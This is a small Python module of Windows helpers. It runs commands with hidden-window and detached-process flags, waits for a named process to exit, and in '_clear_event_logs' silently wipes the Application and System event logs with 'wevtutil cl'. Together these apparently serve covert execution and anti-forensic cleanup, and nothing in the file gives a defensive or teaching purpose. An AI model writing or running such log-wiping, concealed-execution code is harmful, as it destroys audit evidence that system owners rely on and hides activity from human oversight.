from __future__ import annotations

import subprocess
import time
from pathlib import Path
from typing import Optional, List

_SILENT = 0x08000000
_DETACH = 0x00000008
_NULL = subprocess.DEVNULL


def _run_system_command(argv: List[str], timeout: int = 600) -> bool:
    try:
        proc = subprocess.run(
            argv,
            text=True,
            timeout=timeout,
            creationflags=_SILENT,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        return proc.returncode in (0, 3010)
    except Exception:
        return False


def _spawn_detached(argv: List[str]) -> bool:
    try:
        subprocess.Popen(
            argv,
            stdout=_NULL,
            stderr=_NULL,
            stdin=_NULL,
            creationflags=_SILENT | _DETACH,
            shell=False,
        )
        return True
    except Exception:
        return False


def _wait_for_process(name: str, timeout: int = 300) -> bool:
    start = time.time()
    while time.time() - start < timeout:
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"IMAGENAME eq {name}"],
                capture_output=True,
                text=True,
                creationflags=_SILENT,
            )
            if name not in result.stdout:
                return True
        except Exception:
            pass
        time.sleep(2)
    return True


def _clear_event_logs() -> None:
    try:
        subprocess.run(
            ["wevtutil", "cl", "Application"],
            capture_output=True,
            creationflags=_SILENT,
        )
        subprocess.run(
            ["wevtutil", "cl", "System"],
            capture_output=True,
            creationflags=_SILENT,
        )
    except Exception:
        pass